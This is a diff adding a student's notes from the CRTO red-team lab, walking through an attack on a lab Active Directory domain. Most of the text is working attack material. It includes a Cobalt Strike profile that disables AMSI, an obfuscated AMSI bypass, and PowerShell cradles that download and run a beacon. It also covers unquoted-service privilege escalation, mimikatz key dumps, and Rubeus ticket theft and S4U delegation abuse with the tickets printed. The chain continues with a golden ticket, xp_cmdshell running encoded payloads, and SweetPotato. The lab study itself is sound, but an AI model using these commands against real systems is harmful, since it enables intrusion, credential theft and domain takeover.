@@ -1,0 +1,252 @@
+Notes for CRTO
+
+I started off making the malleable profile, (Help from Bobbt and Kozmer)
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!1
+#
+#dsafModded
+#
+#
+#
+#
+
+set sleeptime "30000"; ## use a -30s delay between callbacks
+set jitter    "20";
+set maxdns    "255";
+set useragent "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)";
+
+post-ex {
+    # Optionally specify non-existent filepath to force manual specification based on the Beacon host's running processes
+    set spawnto_x86 "%windir%\\syswow64\\dllhost.exe";
+    # Hardcode paths like C:\\Windows\\System32\\dllhost.exe to avoid potential detections for %SYSNATIVE% use. !! This will break when attempting to spawn a 64bit post-ex job from a 32bit Beacon.
+    set spawnto_x64 "%windir%\\sysnative\\dllhost.exe";
+    # change the permissions and content of our post-ex DLLs
+    set obfuscate "true";
+    # pass key function pointers from Beacon to its child jobs
+    set smartinject "true";
+    # disable AMSI in powerpick, execute-assembly, and psinject
+    set amsi_disable "true";
+    # Modify our post-ex pipe names
+    set pipename "Winsock2\\CatalogChangeListener-###-0,";
+    set keylogger "GetAsyncKeyState";
+    #set threadhint "module!function+0x##"
+}
+
+http-get {
+
+    set uri "/pixel";
+
+    client {
+        metadata {
+            base64;
+            header "Cookie";
+        }
+    }
+
+    server {
+
+        header "Connection" "Keep-Alive";
+        header "Cache-Control" "no-cashe";
+
+        output{
+            print;
+        }
+    }
+}
+http-post {
+
+    set uri "/submit.php";
+
+    client {
+
+        header "Accept" "*/*";
+        header "Accept-Language" "en-en";
+        header "Connection" "Keel-Alive";
+        header "Cache-Control" "no-cache";
+
+        id {
+            parameter"id";
+        }
+
+        output {
+            print;
+        }
+
+    }
+    server {
+
+        header "Contect-Type" "application/octet-stream";
+        header "Cache-Control" "no-cache";
+
+        output {
+            base64;
+            print;
+        }
+    }
+}
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+Then I modified Artifacts Kit and Resource Kit using ThreatChecker with the default engine and -e AMSI
+
+
+
+I first created my HTTP-Listener and created the Web Drive By powershell command 
+powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.100.135:80/a'))"
+
+I Connected to WorkStation 2069 and I ran a AMSI bypass from https://github.com/kyle41111/RedTeamHelp/blob/main/AMSI/April2022Amsi
+S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
+
+I then ran the Powershell Script to pull my beacon
+powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.100.135:80/a'))"
+
+
+
+After some Enumeration I was able to see the Service "rtoTestSvc" was unquoted,
+run wmic service get name, pathname
+powershell Get-Acl -Path "C:\Program Files\Red Team Ops\" | fl
+
+
+I then see:
+Path   : Microsoft.PowerShell.Core\FileSystem::C:\Program Files\Red Team Ops\
+Owner  : BUILTIN\Administrators
+Group  : WKSTN-2069\None
+Access : NT AUTHORITY\Authenticated Users Allow  Write, ReadAndExecute, Synchronize
+
+
+
+I created a SMB_listener
+I created a Package -> Windows Exectuable -> Windows Service EXE and selected the SMB_Listener
+and I uploaded it to the C:\Program Files\Red Team Ops\ 
+I named it RTO.exe
+I then ran:
+"run sc start rtoTestSvc"
+and
+link 127.0.0.1 msagent_05
+So I was able to elevate tp SVC_Tech, to get system I just right click and selected "Access -> Elevate" and I got System.
+
+
+Getting SRV Flag
+Constrained Delegation
+execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe triage
+ -------------------------------------------------------------------------------------------------------------- 
+ | LUID    | UserName                      | Service                                   | EndTime              |
+ -------------------------------------------------------------------------------------------------------------- 
+ | 0x6b554 | svc_test @ CHILD.RTO.LOCAL    | krbtgt/CHILD.RTO.LOCAL                    | 9/8/2022 12:36:08 PM |
+ | 0x6b554 | svc_test @ CHILD.RTO.LOCAL    | ldap/dc-2.child.rto.local                 | 9/8/2022 12:36:08 PM |
+
+execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe dump /luid:0x6b30d /service:krbtgt /nowrap
+I then get     Base64EncodedTicket   :
+
+      doIFRDCCBUCgAwIBBaEDAgEWooIEQDCCBDxhggQ4MIIENKADAgEFoREbD0NISUxELlJUTy5MT0NBTKIkMCKgAwIBAqEbMBkbBmtyYnRndBsPQ0hJTEQuUlRPLkxPQ0FMo4ID8jCCA+6gAwIBEqEDAgECooID4ASCA9y+XowbGx4bnvJO0AlCWHX3f9pInmoA7YfyP5oENyqFjJAM+NE/SlDMOM0fCNHXAqjxEHyyCXy8vWmptS1oyKis+L1wV5RffYlpLN0YDqSq6tTcMChywaEtnrpXMC5GEPOxateP9Fv2V32Ckke6aO/oKWVUZqBQC9Oidh1Nw3hHKB7lzxw6CV6jybL9Z9tSNvBhyQWXDgD/ZCc+p77br7vWT2ga0GgPl+Svdyph8Ramhj8t7riQlq+p8HWYrw8VuJekrRMSzawaf6U/QlKJsnQxcEoD/REABHjXjilh662mVHLYcwUdBZeF+XiEW+yON0yUx9E/zQpu7t8zx1/L2u2o5INc4c58uBDGWJUob24IF2jHq28lU9kcJUSSVFsxIAQOIdPfNCqAu/iii9Wxbrh2I/q0RsBdtUwomMDozkvXsnyn3rJQbjpj/KMJEuD4lIFwwkglwW1sKMmjHdnIidolIHolTWnt66xqha3vo1RPAoJbvUEla/2xloeIxYxY6TjaowazAFf9wG5TusE+FRrMRM3ff1Xx+58XzvGzs0B1qGhygGq6YD68nn3qMw0AVihazwjXYlPDpTxK14w+5H5UYvtRadgmZWz7cauSHKby4NHeQ5VBO3zDIRYYdLZm4ZVpsl+BhWbmVxXjNBSZekLkZhi2vxbsAft2eiOHFWC81acbOajMrPCvsSOWkSnbIi2MqXD4S8YVyciF7kBniJGSZtql+i6jAX0DpydHSf15oNGjFiJYEBvU1f5MjDqyQ8Egmc03+sOt9Z+oWIIjOtows2cml26nU2s2lI8oFFczipUlQd4ETg62pug1d6q0b5JOR1XdM3CvJfjwezeJz38kb6Kq8M2iYrWTpzCaA0Sx0tGPEnlTBK9eBpQZF9z+NHSAZn1S8nrdwGsm/Mm11O9r1N2F3AP6F8HyujzypE/ok8zU+MoOMFRHj73HSBC9RBUHt7gTMUmBjgLPeABDh2tLquyHTU3ahS8WwV+V2R/EbJ7uJRCiqnGZlL89nXIP+odXUrr+d7G+XSZzIkl3dNHTJ00s2Wu9D6TxwGKf4m8b2ZJE4bB+VmFTix3e+h/8vtsCVui/kntbIDbR3qMvSOiC95dN7X3u4Bzy/ktG+4tZUsoItLDhyAYNWIoHwE5UMD5ZVzyTM2JJClVG1Psxuc65ZvKvd/jWHm34ixFst/AuiCuiw44mifCk6ffKBaZs1oE7/7H+hZ1wh/29u4EYbnJHT0gfv+t42vK6qH6nu7eBU0JbyxafTFv84838IliyoCHMxGQGV53k21tLIgMGsJzJkheDJxJia26r/+kno4HvMIHsoAMCAQCigeQEgeF9gd4wgduggdgwgdUwgdKgKzApoAMCARKhIgQgZJZqsHhL0wEz9shCAIaJgfbsx/CKoWyGQNsmyh0+a3WhERsPQ0hJTEQuUlRPLkxPQ0FMohUwE6ADAgEBoQwwChsIc3ZjX3Rlc3SjBwMFAEDhAAClERgPMjAyMjA5MDgwMjM2MDhaphEYDzIwMjIwOTA4MTIzNjA4WqcRGA8yMDIyMDkxNTAyMzYwOFqoERsPQ0hJTEQuUlRPLkxPQ0FMqSQwIqADAgECoRswGRsGa3JidGd0Gw9DSElMRC5SVE8uTE9DQUw=
+
+
+I then grab the ekeys for SVC_Test
+mimikatz sekurlsa::ekeys
+
+Authentication Id : 0 ; 439636 (00000000:0006b554)
+Session           : Service from 0
+User Name         : svc_test
+Domain            : CHILD
+Logon Server      : DC-2
+Logon Time        : 9/8/2022 2:36:08 AM
+SID               : S-1-5-21-1886337448-2504686659-850325809-1114
+
+	 * Username : svc_test
+	 * Domain   : CHILD.RTO.LOCAL
+	 * Password : (null)
+	 * Key List :
+	   aes256_hmac       13bbd393caefb2a65419ff6be4cd0e192ecef1a497e23798c1e8e8ac381c14e7
+	   rc4_hmac_nt       60e8cb47427ae9508a5bd4b8acefdf0a
+	   rc4_hmac_old      60e8cb47427ae9508a5bd4b8acefdf0a
+	   rc4_md4           60e8cb47427ae9508a5bd4b8acefdf0a
+	   rc4_hmac_nt_exp   60e8cb47427ae9508a5bd4b8acefdf0a
+	   rc4_hmac_old_exp  60e8cb47427ae9508a5bd4b8acefdf0a
+
+
+
+With AES256_HMAC I ran the following
+execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe asktgt /user:svc_test /aes256:13bbd393caefb2a65419ff6be4cd0e192ecef1a497e23798c1e8e8ac381c14e7 /opsec /nowrap
+
+I then got the following output:
+[+] TGT request successful!
+[*] base64(ticket.kirbi):
+
+      doIFRDCCBUCgAwIBBaEDAgEWooIEQDCCBDxhggQ4MIIENKADAgEFoREbD0NISUxELlJUTy5MT0NBTKIkMCKgAwIBAqEbMBkbBmtyYnRndBsPQ0hJTEQuUlRPLkxPQ0FMo4ID8jCCA+6gAwIBEqEDAgECooID4ASCA9xCJmZZ9eNqCVTY4LN/GUu4FsUw6o2A4LWTg2cukTdshIaSUp/RbTqL2jKJ63NDUh9YAN1K9lqVgDiBevhqVUT48mI3dHtIFMp+SjmQnQsN9WNFLStWGyJjeJMuFoe0ghoZI1f4I8UcvyAUQaaUAYnHAlx18tPvbkziXkWn6kz6B+KcJU+INolJAKa/zRRq61VyQFSrwUwVO/NuM5QrZ2AHM2k0KN6TNznMmyUNy7JNmGtsx5l4oSQbl5G02pjyTw3OYaFDo58ID+4JmYgTT9Msqf3DXXtMCU5FxpbPCTseMnGbidpDSHVX1HJurJIGYE/m5TsU7MVIa0+aRS03aLFgBF0V/UaoFYRATvmDoIQurJXlJAyOaCAg2AX/0rd2nDydAuxpaJlwnsmdYfJqD5EwGaLPI/w/rf3JCeMlK4h90LG8M08EtjTUsJtyZc2aa9JDX0ZvLbDzAKt3X7JP8XQDIZx62vwZsO6DNo2kxPv+zW5/lmsaoObcdE5lTLAjzSk+JuSmsabRKfGmmh0umeWGbYl7aUX1/ayxkrf6OJAseTpwDE51ualVjJpZkNdIkNcFbL2zWaC/USnxrmiGDcgFY1ZwOZ8dtYFvgWSizEJBZKyU0MmQmPCw2IO7xbM3YyE1tg5wfaRwkjqoxPtntjiqoz5z3oc0Zjzma7BdWw9z+fC9UAr9BM33vtwxH5g1V6Xh92K9nfcjqV6lJ1YdehtFjkSJfy4p81fZes1hXXTsBUhez3/dUA8s7J0ZR8OYxCyBLd4huC7pQbLlJUYmZMupC+uCzTZr43f+f0h4SxvppHt3C7egfzI/oNOgljpqdTxJdYP2A5C5udOhhGh7FieyfX9YGc0FLXr25/eoKCmMyYt+ynBVxnB6oS0PMWX0/eSHEWfb8JOAUr9Vbqx0d878Z4Q+Lgzd7EFjgyDe1Isx5U6MSRv/Yi+B7kSwLOFJkwwla8wqCKf/ZDkoKJoTMpzOpaeyTa1WtDsxtrVgdulJsFXFQHgFa9DVLZR9m/w6UKQzLA52hJNeMg5zo6dosmH013Y1FAqW8Ty2u0on6LQ+x7Q4DMyl87BY/5Fc9dbwLz11UJqj8Y85JdVMlC9Wa7zOx1yX+tJsiOlg07tpdMf+5LcRNJX77zQ+/bNei9i+7cDl1/xkS2qB2HY8NPywxENtfpEQrMG06/ehrcEBNR2PoxynGPD2DYnRkxE+8dzizPaVk4z5iWxIihy4GCOAP+My/s14TcGgFy4ZWrU1W+FCAYQ1KMQ1JIaEgi5o3mW/utoBJOC//nM5XRtuDduFhkfDzVRNMM1gS8vcEfCio4HvMIHsoAMCAQCigeQEgeF9gd4wgduggdgwgdUwgdKgKzApoAMCARKhIgQg6EbR3ze0gBpiJu/KUQkmCIn7n9EqqT33Zll6Wxa0v8uhERsPQ0hJTEQuUlRPLkxPQ0FMohUwE6ADAgEBoQwwChsIc3ZjX3Rlc3SjBwMFAEDhAAClERgPMjAyMjA5MDgwMzAyMzVaphEYDzIwMjIwOTA4MTMwMjM1WqcRGA8yMDIyMDkxNTAzMDIzNVqoERsPQ0hJTEQuUlRPLkxPQ0FMqSQwIqADAgECoRswGRsGa3JidGd0Gw9DSElMRC5SVE8uTE9DQUw=
+
+  ServiceName              :  krbtgt/CHILD.RTO.LOCAL
+  ServiceRealm             :  CHILD.RTO.LOCAL
+  UserName                 :  svc_test
+  UserRealm                :  CHILD.RTO.LOCAL
+  StartTime                :  9/8/2022 3:02:35 AM
+  EndTime                  :  9/8/2022 1:02:35 PM
+  RenewTill                :  9/15/2022 3:02:35 AM
+  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
+  KeyType                  :  aes256_cts_hmac_sha1
+  Base64(key)              :  6EbR3ze0gBpiJu/KUQkmCIn7n9EqqT33Zll6Wxa0v8s=
+  ASREP (key)              :  13BBD393CAEFB2A65419FF6BE4CD0E192ECEF1A497E23798C1E8E8AC381C14E7
+
+
+
+
+
+execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe s4u /impersonateuser:c.boyd /msdsspn:cifs/srv.child.rto.local /user:svc_test /ticket:doIFRDCCBUCgAwIBBaEDAgEWooIEQDCCBDxhggQ4MIIENKADAgEFoREbD0NISUxELlJUTy5MT0NBTKIkMCKgAwIBAqEbMBkbBmtyYnRndBsPQ0hJTEQuUlRPLkxPQ0FMo4ID8jCCA+6gAwIBEqEDAgECooID4ASCA9xCJmZZ9eNqCVTY4LN/GUu4FsUw6o2A4LWTg2cukTdshIaSUp/RbTqL2jKJ63NDUh9YAN1K9lqVgDiBevhqVUT48mI3dHtIFMp+SjmQnQsN9WNFLStWGyJjeJMuFoe0ghoZI1f4I8UcvyAUQaaUAYnHAlx18tPvbkziXkWn6kz6B+KcJU+INolJAKa/zRRq61VyQFSrwUwVO/NuM5QrZ2AHM2k0KN6TNznMmyUNy7JNmGtsx5l4oSQbl5G02pjyTw3OYaFDo58ID+4JmYgTT9Msqf3DXXtMCU5FxpbPCTseMnGbidpDSHVX1HJurJIGYE/m5TsU7MVIa0+aRS03aLFgBF0V/UaoFYRATvmDoIQurJXlJAyOaCAg2AX/0rd2nDydAuxpaJlwnsmdYfJqD5EwGaLPI/w/rf3JCeMlK4h90LG8M08EtjTUsJtyZc2aa9JDX0ZvLbDzAKt3X7JP8XQDIZx62vwZsO6DNo2kxPv+zW5/lmsaoObcdE5lTLAjzSk+JuSmsabRKfGmmh0umeWGbYl7aUX1/ayxkrf6OJAseTpwDE51ualVjJpZkNdIkNcFbL2zWaC/USnxrmiGDcgFY1ZwOZ8dtYFvgWSizEJBZKyU0MmQmPCw2IO7xbM3YyE1tg5wfaRwkjqoxPtntjiqoz5z3oc0Zjzma7BdWw9z+fC9UAr9BM33vtwxH5g1V6Xh92K9nfcjqV6lJ1YdehtFjkSJfy4p81fZes1hXXTsBUhez3/dUA8s7J0ZR8OYxCyBLd4huC7pQbLlJUYmZMupC+uCzTZr43f+f0h4SxvppHt3C7egfzI/oNOgljpqdTxJdYP2A5C5udOhhGh7FieyfX9YGc0FLXr25/eoKCmMyYt+ynBVxnB6oS0PMWX0/eSHEWfb8JOAUr9Vbqx0d878Z4Q+Lgzd7EFjgyDe1Isx5U6MSRv/Yi+B7kSwLOFJkwwla8wqCKf/ZDkoKJoTMpzOpaeyTa1WtDsxtrVgdulJsFXFQHgFa9DVLZR9m/w6UKQzLA52hJNeMg5zo6dosmH013Y1FAqW8Ty2u0on6LQ+x7Q4DMyl87BY/5Fc9dbwLz11UJqj8Y85JdVMlC9Wa7zOx1yX+tJsiOlg07tpdMf+5LcRNJX77zQ+/bNei9i+7cDl1/xkS2qB2HY8NPywxENtfpEQrMG06/ehrcEBNR2PoxynGPD2DYnRkxE+8dzizPaVk4z5iWxIihy4GCOAP+My/s14TcGgFy4ZWrU1W+FCAYQ1KMQ1JIaEgi5o3mW/utoBJOC//nM5XRtuDduFhkfDzVRNMM1gS8vcEfCio4HvMIHsoAMCAQCigeQEgeF9gd4wgduggdgwgdUwgdKgKzApoAMCARKhIgQg6EbR3ze0gBpiJu/KUQkmCIn7n9EqqT33Zll6Wxa0v8uhERsPQ0hJTEQuUlRPLkxPQ0FMohUwE6ADAgEBoQwwChsIc3ZjX3Rlc3SjBwMFAEDhAAClERgPMjAyMjA5MDgwMzAyMzVaphEYDzIwMjIwOTA4MTMwMjM1WqcRGA8yMDIyMDkxNTAzMDIzNVqoERsPQ0hJTEQuUlRPLkxPQ0FMqSQwIqADAgECoRswGRsGa3JidGd0Gw9DSElMRC5SVE8uTE9DQUw= /nowrap
+
+
+ I then Recieved the Following output:
+ [*] Using domain controller: dc-2.child.rto.local (10.10.124.155)
+[*] Building S4U2self request for: 'svc_test@CHILD.RTO.LOCAL'
+[*] Sending S4U2self request
+[+] S4U2self success!
+[*] Got a TGS for 'c.boyd' to 'svc_test@CHILD.RTO.LOCAL'
+[*] base64(ticket.kirbi):
+
+      doIFTjCCBUqgAwIBBaEDAgEWooIEazCCBGdhggRjMIIEX6ADAgEFoREbD0NISUxELlJUTy5MT0NBTKIVMBOgAwIBAaEMMAobCHN2Y190ZXN0o4IELDCCBCigAwIBF6EDAgECooIEGgSCBBaELGFVpik5AqGDh62EHRQLcYSUeJQO7APayXonaz8u8RksxMiurmHXwzZnZLI6wO752JZjEUoXQpb4rznfW5dn/e1g1nNvh7UEuU35ouG1UMt2018bfsIIe1erEYFrNrqD1g4xkjwuGcSJiLQm8i4ynkTshj/2zsKeVQH2/tCBjRuYvaWF9FbEIF33pc1olf8BoXD0w+lvX/N9CWyds8mde1HumlQdp1F3f+r30eyEth/H7hYq8AA/YY3FGUCvkVxp3hiWd647d4SKkmXnPrBkSUKa/hPCnCHeQeQlHTZnj96gon6VJsg3ExtDZrNpjW8kNqvTnep73Sq3zgUxlpSZRg3++L6QlenDv1BkNCAw0w7UiaKfcXHNH3kT7PwhKKQIa0lJxJZWGGShLE6cbOj56H6AqejFle65HIdTEDYvPjzjDXKawPrWAi4SAjiD5YHRXxJoOx7ZL0NbgoyZJcMvTAG/r56Zy19ciYyLvBkCczq2ZAph5yW8FA49YL19w1lGZDR8CYgMcHLnYx1/xUoMzNuV5MFX1mwJjEg+8tQrDWHVqI7n8m4D92+d6HBiSY1ow73Am1wEN5m4GHQ66CXH9oxR6wy05Q/ismPAGuAvNNG7vEoJTa1raPDhaVbA23FFPMMwFGXjJZSkMB99fPldgvfOvr5TmnF5x75xWVNhqR/+L2DYjMf9fXvwNZid87RUxaLaPnurX7dAuF08B7ar2CafFPx1r+QQtihSQlP1arhXaHUipEIZekW/BCkV4XSnt+UWcLgIuzYlqBaLGdV4Gl+FYpsoH9JlYnsIUvroJhEqWGjN7FRoihKO9zdZhH9Z12vW3VZNmaDNMu4OGPE38vdEerWMOJMs50q/dCRl3GCzONXqE9QAchHjkENBF6fjfJlE+6Viv5DyrVMK0p4KOxwiKhR0jGTwW6uqPaLvpW4/l3xlCPL7df3EDadRSaeqOD7lPX4hRCduiW2mz+ID08Ep8J1wHyb9obwtELnpGKCs5Ig/zoItPCFxNkUbtevelPlyXnl8MXkbmZ/TOQOAUVNOGYEyJigdrn8W00sekWlunENgdnlskjiG4ldlOIzblYlz4zxxsRHWcZXdBHYIaIDk+7LJpg96+AJLqMYoziH6TP+70hwlutzPc324JDz72ztniymrZLmuF/sXzO3VUBxiIISLttNEuh0obRqJAxQG5PqyAD9JjPWlucwUmJ704u8F6iWJKLugyCy/JpfuZKLRMKmtRXhobG59pa9Jav0KKb1uB+7I1cflYzt32X9t4LGISNIrEMFDyo4A+r0PsKHcD9Z9ne4wyWhTOHA88/aevZ7I0LC4BCdxZWFffTAbjc07TCS2me+LU80MOp4p/t5m64gCNBWDeYaM0FvdJwcx+AoNHKOBzjCBy6ADAgEAooHDBIHAfYG9MIG6oIG3MIG0MIGxoBswGaADAgEXoRIEEPM6NUcwdZBpGXuox1BsTSihERsPQ0hJTEQuUlRPLkxPQ0FMohMwEaADAgEKoQowCBsGYy5ib3lkowcDBQBAoQAApREYDzIwMjIwOTA4MDMwODIzWqYRGA8yMDIyMDkwODEzMDIzNVqnERgPMjAyMjA5MTUwMzAyMzVaqBEbD0NISUxELlJUTy5MT0NBTKkVMBOgAwIBAaEMMAobCHN2Y190ZXN0
+
+[*] Impersonating user 'c.boyd' to target SPN 'cifs/srv.child.rto.local'
+[*] Using domain controller: dc-2.child.rto.local (10.10.124.155)
+[*] Building S4U2proxy request for service: 'cifs/srv.child.rto.local'
+[*] Sending S4U2proxy request
+[+] S4U2proxy success!
+[*] base64(ticket.kirbi) for SPN 'cifs/srv.child.rto.local':
+
+      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
+
+I opened powershell ISE and ran:
+[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\cifs.kirbi", [System.Convert]::FromBase64String("TICKET_HERE"))
+Which then made a Kirbi file on the Desktop that I can use to move to With the SVC_Tech account I was able to use constrainded Delegation to access SRV by impersonating c.boyd.
+From SRV i was able to impersonate n.french to use unconstrained delegation to access DC-2. From there I made Raskul a Domain admin and I made Golden ticket
+with the KRBTGT account to move to DC-1.
+
+
+
+
+
+To Get to the SQL Server 
+
+On the DC
+Step one create privot listener
+step 2 PTH as Admininstrator
+Step 3 Jump PSexec64 SQl (name of Pivot)
+
+
+My notes lol How to get to external SQL Server
+1. Create Pivot for SQL internal to reach Kali rportfwd 8080 10.10.100.135 80
+2. Create a listerner on SQL Port 4446 Beacon_Reverse_TCP
+3. Created a Drive-by Script using the listener 4446
+4. I Modified to the script to show the IP of the SQL server and the port 8080
+5. Used Powershell ISE to encode to base64
+6. On SQL.rto.local I ran
+Powershell-Import PowerUpSQL
+powerpick Get-SQLQuery -Instance "sql.rto.local,1433" -Query "EXEC('xp_cmdshell ''powershell.exe -nop -w hidden -e SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADIAMwAuADUANQA6ADgAMAA4ADAALwBSADIAJwApACkA''') AT [sql.rto.external]"
+
+
+To get System I Ran Sweet Potato
+execute-assembly C:\Tools\SweetPotato\bin\Release\SweetPotato.exe -p C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -a "-w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADIAMwAuADUANQA6ADgAMAA4ADAALwBzACcAKQApAA=="
+
+
+
+
+
+
+
